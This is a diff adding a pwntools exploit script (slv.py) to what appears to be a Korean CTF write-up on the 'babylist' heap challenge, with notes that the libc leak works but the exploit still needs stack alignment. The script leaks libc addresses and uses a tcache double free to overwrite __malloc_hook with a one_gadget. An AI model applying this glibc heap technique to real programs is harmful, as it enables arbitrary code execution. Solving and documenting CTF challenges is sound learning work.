@@ -43,7 +43,199 @@ $$$$$$$$$$$$$$$$$$$$$$$$$$
 
 ## slv.py
 
+```python
+from pwn import *
+
+p = process('./babylist')
+
+
+id = [False for i in range(10)]
+
+
+context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
+#context.log_level = 'debug'
+
+script = '''
+
+'''
+
+sla = lambda s,c : p.sendlineafter(s, str(c))
+
+one_gadget_offset = [0x4f365, 0x4f3c2, 0x10a45c]
+__malloc_hook_offset = 0x3ebc30
+__free_hook_offset = 0x3ed8e8
+def Create_list(name):
+    
+    idx = -1
+    sla('> ', 1)
+    
+    sla(':\n', name)
+    
+    for i in range(10):
+        
+        if id[i] == False:
+            idx = i
+            id[i] = True
+            break
+    
+    if idx == -1:
+        print("list is full")
+        exit(0)
+    
+    
+    return idx
+
+
+def Add_element(index, number):
+    
+    sla('> ', 2)
+    
+    sla(':\n', index)
+    
+    sla(':\n', number)
+    
+    
+    return
+
+
+def View_element(index_list, index_elm):
+    
+    sla('> ', 3)
+    
+    sla(':\n', index_list)
+    
+    sla(':\n', index_elm)
+    
+    
+    
+    return p.recvuntil('\n')
+
+
+def Duplicate_list(index, name):
+    
+    idx = -1
+    
+    sla('> ', 4)
+    
+    sla(':\n', index)
+    
+    sla(':\n', name)
+    
+    for i in range(10):
+        
+        if id[i] == False:
+            idx = i
+            id[i] = True
+            break
+    
+    if idx == -1:
+        print("list is full")
+        exit(0)
+    
+    
+    return idx
+
+
+def Remove_list(index):
+    
+    sla('> ', 5)
+    
+    sla(':\n', index)
+    
+    id[index] = False
+    
+    return
+
+
+def main():
+    global script
+    
+    ########## STAGE 1 [libc leak] ###########
+
+    
+    a = Create_list('a')
+    
+    for i in range(400):
+        Add_element(a,i);
+    
+    b = Duplicate_list(a, 'b')
+    
+    for i in range(400):
+        Add_element(b,i)
+    
+    libc_leak = int(View_element(0,1).split(' = ')[1]) << 32
+    
+    libc_leak += int(View_element(0,0).split(' = ')[1]) & 0xffffffff
+    
+    libc_base = libc_leak - 0x3ebca0
+    one_gadget_addr = libc_base + one_gadget_offset[0]
+    __malloc_hook_addr = libc_base + __malloc_hook_offset
+    __free_hook_addr = libc_base + __free_hook_offset
+    
+    log.info('libc_base : ' + hex(libc_base))
+    
+    
+    ########## STAGE 2 [exploit] ###########
+    f = Create_list('f')
+    Add_element(f, __malloc_hook_addr & 0xffffffff)
+    Add_element(f, __malloc_hook_addr >> 32)
+    
+    '''
+    using double free & tcache fd 
+    '''
+    
+    c = Create_list('c')
+    
+    Add_element(c, 1)
+    
+    d = Duplicate_list(c, 'd')
+    
+    Add_element(d, 1)
+    
+    for i in range(4):
+        Add_element(c, i)
+    
+    
+    
+    log.info('__malloc_hook_addr : ' + hex(__malloc_hook_addr))
+    log.info('__free_hook_addr : ' + hex(__free_hook_addr))
+    log.info('one_gadget_addr : ' + hex(one_gadget_addr))
+    
+    Add_element(f, 0x5eadbeef)
+    
+    g = Create_list('g')
+    Add_element(g, one_gadget_addr & 0xffffffff)
+    Add_element(g, one_gadget_addr >> 32)
+    
+    script += 'b* ' + hex(one_gadget_addr)
+    gdb.attach(p,script)
+    
+    h = Create_list('h')
+    Add_element(h, 0x5eadbeef)
+    
+    i = Duplicate_list(g, 'i')
+    Add_element(i , 0x5eadbeef)
+    
+    
+    #sla('> ', 1)
+    #Add_element(h,2)
+    
+    
+    p.interactive()
+    
+    
+    
+    return
+
+
+
+if __name__ == '__main__':
+    main()
+    
+```
+
 libc_leak은 성공..(20.08.31)
+exploit 절반 성공... rsp를 0x10으로 aligned 시켜줘야됨 ~~개빡치네 진짜로~~(20.09.1)
 
 
 ## 느낀 점
